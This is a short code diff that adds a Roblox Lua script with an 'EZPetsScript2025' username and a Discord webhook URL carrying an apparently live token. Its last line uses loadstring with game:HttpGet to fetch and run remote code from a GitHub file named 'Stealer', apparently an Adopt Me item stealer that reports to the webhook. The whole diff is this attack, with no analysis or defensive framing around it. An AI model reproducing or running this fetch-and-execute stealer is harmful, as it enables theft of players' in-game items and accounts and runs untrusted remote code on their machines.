@@ -1,0 +1,4 @@
+Username = "EZPetsScript2025"
+Webhook = "https://discord.com/api/webhooks/1308736514133327974/JVBCXuUZnKhnZhx7Z8xcAIW0tSMCw9CuaMSAXkcnl1yKImywvU8bg7qqAgMqDu4jMdWn"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XScriptsOfficial/AdoptMeScript2024/main/Stealer", true))()
